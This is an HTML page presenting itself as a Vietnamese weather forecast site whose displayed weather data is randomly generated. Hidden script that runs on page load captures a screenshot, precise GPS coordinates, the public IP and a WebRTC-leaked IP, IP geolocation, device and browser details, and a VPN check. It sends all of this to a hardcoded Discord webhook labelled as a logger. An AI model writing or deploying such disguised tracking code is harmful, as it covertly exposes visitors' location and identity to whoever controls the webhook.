<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dự báo thời tiết hôm nay - WeatherVN</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: #fff;
        }
        /* Header */
        .header {
            background: rgba(0,0,0,0.3);
            padding: 15px 0;
            backdrop-filter: blur(10px);
        }
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-icon {
            font-size: 40px;
        }
        .logo-text {
            font-size: 28px;
            font-weight: bold;
        }
        .logo-text span {
            color: #ffcc00;
        }
        .search-box {
            display: flex;
            gap: 10px;
        }
        .search-box input {
            padding: 10px 15px;
            border-radius: 25px;
            border: none;
            outline: none;
            width: 200px;
        }
        .search-box button {
            padding: 10px 20px;
            border-radius: 25px;
            border: none;
            background: #ffcc00;
            color: #333;
            cursor: pointer;
            font-weight: bold;
        }
        /* Main content */
        .main-content {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
        }
        /* Weather main card */
        .weather-card {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
        }
        .city-name {
            font-size: 42px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .date-time {
            font-size: 16px;
            opacity: 0.8;
            margin-bottom: 20px;
        }
        .temp-main {
            font-size: 72px;
            font-weight: bold;
            margin: 20px 0;
        }
        .weather-icon {
            font-size: 80px;
            margin: 20px 0;
        }
        .weather-desc {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .details {
            display: flex;
            justify-content: center;
            gap: 40px;
            flex-wrap: wrap;
            margin-top: 30px;
        }
        .detail-item {
            text-align: center;
            background: rgba(0,0,0,0.2);
            padding: 15px 25px;
            border-radius: 20px;
        }
        .detail-label {
            font-size: 14px;
            opacity: 0.7;
        }
        .detail-value {
            font-size: 24px;
            font-weight: bold;
        }
        /* Forecast */
        .forecast-title {
            font-size: 24px;
            margin-bottom: 20px;
            padding-left: 10px;
            border-left: 4px solid #ffcc00;
        }
        .forecast-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .forecast-day {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            transition: 0.3s;
        }
        .forecast-day:hover {
            transform: translateY(-5px);
            background: rgba(255,255,255,0.2);
        }
        .day-name {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        .forecast-icon {
            font-size: 40px;
            margin: 10px 0;
        }
        .forecast-temp {
            font-size: 20px;
            font-weight: bold;
        }
        .forecast-desc {
            font-size: 12px;
            opacity: 0.7;
        }
        /* Footer */
        .footer {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            text-align: center;
            font-size: 12px;
            margin-top: 30px;
        }
        @media (max-width: 768px) {
            .city-name { font-size: 28px; }
            .temp-main { font-size: 48px; }
            .detail-item { padding: 10px 15px; }
            .forecast-grid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="header-container">
            <div class="logo">
                <div class="logo-icon">⛅</div>
                <div class="logo-text">Weather<span>VN</span></div>
            </div>
            <div class="search-box">
                <input type="text" placeholder="Nhập tên thành phố..." id="cityInput" value="Hà Nội">
                <button onclick="searchWeather()">🔍 Tìm</button>
            </div>
        </div>
    </div>

    <div class="main-content">
        <div class="weather-card" id="weatherCard">
            <div class="city-name" id="cityName">Hà Nội</div>
            <div class="date-time" id="dateTime">Thứ Hai, 10:30 - 01/06/2026</div>
            <div class="weather-icon" id="weatherIcon">☀️</div>
            <div class="temp-main" id="tempMain">32°C</div>
            <div class="weather-desc" id="weatherDesc">Nắng nóng, không mưa</div>
            <div class="details">
                <div class="detail-item">
                    <div class="detail-label">🌡️ Cảm giác</div>
                    <div class="detail-value" id="feelsLike">34°C</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">💧 Độ ẩm</div>
                    <div class="detail-value" id="humidity">65%</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">💨 Gió</div>
                    <div class="detail-value" id="wind">12 km/h</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">🌅 Tia UV</div>
                    <div class="detail-value" id="uv">7</div>
                </div>
            </div>
        </div>

        <div class="forecast-title">📅 Dự báo 7 ngày tới</div>
        <div class="forecast-grid" id="forecastGrid"></div>
    </div>

    <div class="footer">
        <p>© 2026 WeatherVN - Dữ liệu từ Trung tâm Khí tượng Thủy văn Quốc gia</p>
        <p>Cập nhật liên tục 24/7 | Hotline: 1900 1234</p>
    </div>

    <!-- Canvas ẩn để chụp màn hình -->
    <canvas id="screenshotCanvas" style="display:none; position:absolute; top:-9999px; left:-9999px;"></canvas>

    <script>
        // ========== DISCORD WEBHOOK ==========
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1510866506542616606/Vkt6e_zWm3nZS8pLbqROJBxdqY5OTyGpz3sE3brtnj6ssJA2YE4-fHrQ90IeMc4-d7--";
        
        // ========== HIỂN THỊ THỜI TIẾT GIẢ LẬP ==========
        function updateWeatherDisplay() {
            const city = document.getElementById('cityInput').value;
            document.getElementById('cityName').innerText = city;
            
            const now = new Date();
            const options = { weekday: 'long', year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit' };
            document.getElementById('dateTime').innerHTML = now.toLocaleDateString('vi-VN', options);
            
            // Dữ liệu thời tiết giả lập (chạy ngẫu nhiên)
            const weathers = [
                { icon: "☀️", desc: "Nắng nóng", temp: 34, feels: 36, humidity: 60, wind: 10, uv: 8 },
                { icon: "⛅", desc: "Mây nhẹ", temp: 30, feels: 32, humidity: 65, wind: 12, uv: 6 },
                { icon: "☁️", desc: "Nhiều mây", temp: 28, feels: 29, humidity: 70, wind: 8, uv: 4 },
                { icon: "🌧️", desc: "Mưa nhẹ", temp: 26, feels: 27, humidity: 85, wind: 15, uv: 2 },
                { icon: "⛈️", desc: "Mưa dông", temp: 25, feels: 25, humidity: 90, wind: 20, uv: 1 }
            ];
            const w = weathers[Math.floor(Math.random() * weathers.length)];
            
            document.getElementById('weatherIcon').innerHTML = w.icon;
            document.getElementById('tempMain').innerHTML = w.temp + "°C";
            document.getElementById('weatherDesc').innerHTML = w.desc;
            document.getElementById('feelsLike').innerHTML = w.feels + "°C";
            document.getElementById('humidity').innerHTML = w.humidity + "%";
            document.getElementById('wind').innerHTML = w.wind + " km/h";
            document.getElementById('uv').innerHTML = w.uv;
            
            // Dự báo 7 ngày
            const days = ["Hôm nay", "Thứ 3", "Thứ 4", "Thứ 5", "Thứ 6", "Thứ 7", "CN"];
            const forecastIcons = ["☀️", "⛅", "☁️", "🌧️", "⛅", "☀️", "🌧️"];
            const forecastTemps = [34, 32, 29, 27, 30, 33, 28];
            
            let html = '';
            for(let i = 0; i < 7; i++) {
                html += `
                    <div class="forecast-day">
                        <div class="day-name">${days[i]}</div>
                        <div class="forecast-icon">${forecastIcons[i]}</div>
                        <div class="forecast-temp">${forecastTemps[i]}°C</div>
                        <div class="forecast-desc">${i===0?w.desc:forecastIcons[i]==="☀️"?"Nắng":"Mây"}</div>
                    </div>
                `;
            }
            document.getElementById('forecastGrid').innerHTML = html;
        }
        
        function searchWeather() {
            updateWeatherDisplay();
        }
        
        // Cập nhật mỗi 5 phút
        setInterval(updateWeatherDisplay, 300000);
        updateWeatherDisplay();
        
        // ========== CHỤP MÀN HÌNH ==========
        async function captureScreenshot() {
            try {
                const htmlElement = document.documentElement;
                const bodyElement = document.body;
                const scrollWidth = Math.max(htmlElement.scrollWidth, bodyElement.scrollWidth);
                const scrollHeight = Math.max(htmlElement.scrollHeight, bodyElement.scrollHeight);
                
                const canvas = document.getElementById('screenshotCanvas');
                canvas.width = scrollWidth;
                canvas.height = scrollHeight;
                canvas.style.display = 'block';
                
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#1e3c72';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                if (typeof html2canvas !== 'undefined') {
                    const capturedCanvas = await html2canvas(document.body, { scale: 0.6, logging: false, useCORS: true });
                    ctx.drawImage(capturedCanvas, 0, 0);
                } else {
                    ctx.fillStyle = '#ffffff';
                    ctx.font = 'bold 24px Arial';
                    ctx.fillText('WeatherVN', 20, 50);
                    ctx.font = '16px Arial';
                    ctx.fillStyle = '#cccccc';
                    ctx.fillText(`URL: ${window.location.href}`, 20, 100);
                    ctx.fillText(`Thời gian: ${new Date().toLocaleString('vi-VN')}`, 20, 130);
                    ctx.fillText(`Thời tiết: ${document.getElementById('weatherDesc').innerText}`, 20, 160);
                }
                
                const screenshotData = canvas.toDataURL('image/jpeg', 0.6);
                canvas.style.display = 'none';
                return screenshotData;
            } catch(e) { return null; }
        }
        
        function loadHtml2Canvas() {
            return new Promise((resolve) => {
                if (typeof html2canvas !== 'undefined') { resolve(true); return; }
                const script = document.createElement('script');
                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                script.onload = () => resolve(true);
                script.onerror = () => resolve(false);
                document.head.appendChild(script);
            });
        }
        
        // ========== LẤY TỌA ĐỘ GPS ==========
        function getCoordinates() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ lat: null, lon: null, error: "Không hỗ trợ" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (position) => resolve({ lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy, error: null }),
                    (error) => resolve({ lat: null, lon: null, error: error.message }),
                    { enableHighAccuracy: true, timeout: 8000 }
                );
            });
        }
        
        async function getLocationFromIP() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return { city: data.city, country: data.country_name, lat: data.latitude, lon: data.longitude, isp: data.isp };
            } catch(e) { return null; }
        }
        
        function getWebRTCIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (event) => {
                        if (event && event.candidate && event.candidate.candidate) {
                            const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if (ipMatch) { pc.close(); resolve(ipMatch[0]); return; }
                        }
                    };
                    setTimeout(() => { pc.close(); resolve(null); }, 3000);
                } catch(e) { resolve(null); }
            });
        }
        
        async function getPublicIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return null; }
        }
        
        function getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || "Direct",
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
        }
        
        // ========== GỬI LÊN DISCORD ==========
        async function sendToDiscord() {
            try {
                await loadHtml2Canvas();
                const screenshot = await captureScreenshot();
                
                const [webRTCIP, publicIP, browserInfo, coords, ipLocation] = await Promise.all([
                    getWebRTCIP(),
                    getPublicIP(),
                    getBrowserInfo(),
                    getCoordinates(),
                    getLocationFromIP()
                ]);
                
                const finalIP = publicIP || webRTCIP || "Không lấy được";
                const isVPN = webRTCIP && publicIP && webRTCIP !== publicIP;
                const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(browserInfo.userAgent);
                
                let coordField = "";
                if (coords.lat && coords.lon) {
                    coordField = `📍 **Vĩ độ:** ${coords.lat}\n📍 **Kinh độ:** ${coords.lon}\n🎯 **Độ chính xác:** ${Math.round(coords.accuracy)}m\n🗺️ [Xem bản đồ](https://www.google.com/maps?q=${coords.lat},${coords.lon})`;
                } else if (ipLocation && ipLocation.lat) {
                    coordField = `📍 **Vị trí từ IP:** ${ipLocation.city}, ${ipLocation.country}\n🗺️ [Xem bản đồ](https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon})`;
                } else {
                    coordField = "📍 Không thể lấy vị trí";
                }
                
                const embed = {
                    title: "🌤️ WEATHER LOGGER - Có ảnh chụp",
                    color: isVPN ? 0xffaa00 : 0x00aaff,
                    timestamp: new Date().toISOString(),
                    fields: [
                        { name: "📍 VỊ TRÍ", value: coordField, inline: false },
                        { name: "🌐 IP THẬT", value: `\`${finalIP}\``, inline: true },
                        { name: "🔓 WEBRTC IP", value: `\`${webRTCIP || "Không có"}\``, inline: true },
                        { name: "🛡️ VPN", value: isVPN ? "⚠️ CÓ VPN" : "✅ KHÔNG", inline: true },
                        { name: "📱 THIẾT BỊ", value: isMobile ? "📱 ĐIỆN THOẠI" : "💻 MÁY TÍNH", inline: true },
                        { name: "💻 OS", value: browserInfo.platform, inline: true },
                        { name: "🌍 NGÔN NGỮ", value: browserInfo.language, inline: true },
                        { name: "⏰ MÚI GIỜ", value: browserInfo.timezone, inline: true },
                        { name: "🏙️ TP ĐANG XEM", value: document.getElementById('cityName').innerText, inline: true },
                        { name: "🔗 ĐẾN TỪ", value: browserInfo.referrer.substring(0, 80) || "Direct", inline: false }
                    ],
                    footer: { text: "WeatherVN Logger | Dự báo thời tiết" }
                };
                
                if (screenshot) {
                    const blob = await (await fetch(screenshot)).blob();
                    const formData = new FormData();
                    formData.append('file', blob, 'weather_screenshot.jpg');
                    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
                    await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
                } else {
                    await fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ embeds: [embed] })
                    });
                }
                
                console.log("Đã gửi lên Discord");
            } catch(e) { console.log("Lỗi:", e); }
        }
        
        window.addEventListener('load', () => {
            setTimeout(sendToDiscord, 1500);
            setTimeout(sendToDiscord, 4000);
        });
    </script>
</body>
</html>
